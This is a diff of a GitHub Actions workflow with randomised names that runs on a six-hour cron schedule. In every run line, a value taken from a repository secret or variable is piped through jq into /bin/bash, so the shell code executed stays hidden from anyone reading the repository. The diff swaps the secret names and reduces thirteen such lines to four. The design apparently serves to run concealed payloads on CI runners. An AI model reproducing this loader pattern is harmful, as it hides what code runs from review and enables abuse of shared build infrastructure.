@@ -1,8 +1,9 @@
 name: lanxingjian6543
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
+    - cron: '56 0/6 * * *'
 
 jobs:
   build:
@@ -11,19 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: lanxingjian6543
         env:
-          cme2975: ${{ secrets.cme2975 }}
+          nvh97: ${{ secrets.nvh97 }}
         run: |
-          echo $cme2975 | jq -r .coati16069 | /bin/bash
-          echo $qz43876 | jq -r .r8 | /bin/bash
-          echo $fwwwo0 | jq -r .axtcx1326 | /bin/bash
-          echo $o66 | jq -r .ns62 | /bin/bash
-          echo $zbut41 | jq -r .de89 | /bin/bash
-          echo $fqlxq69845 | jq -r .p89806 | /bin/bash
-          echo $lxvpg3540 | jq -r .gw21944 | /bin/bash
-          echo $usf37 | jq -r .q6 | /bin/bash
-          echo $i92548 | jq -r .uidjm71 | /bin/bash
-          echo $dieg22 | jq -r .w11473 | /bin/bash
-          echo $jcoll2 | jq -r .b34 | /bin/bash
-          echo $wpb33 | jq -r .rfqye76 | /bin/bash
-          echo $g91824 | jq -r .eeojb6 | /bin/bash
+          echo $nvh97 | jq -r .vgliv1 | /bin/bash
+          echo $d356 | jq -r .nigt3 | /bin/bash
+          echo $f5722 | jq -r .labpl9480 | /bin/bash
+          echo $j3 | jq -r .ku7 | /bin/bash
 
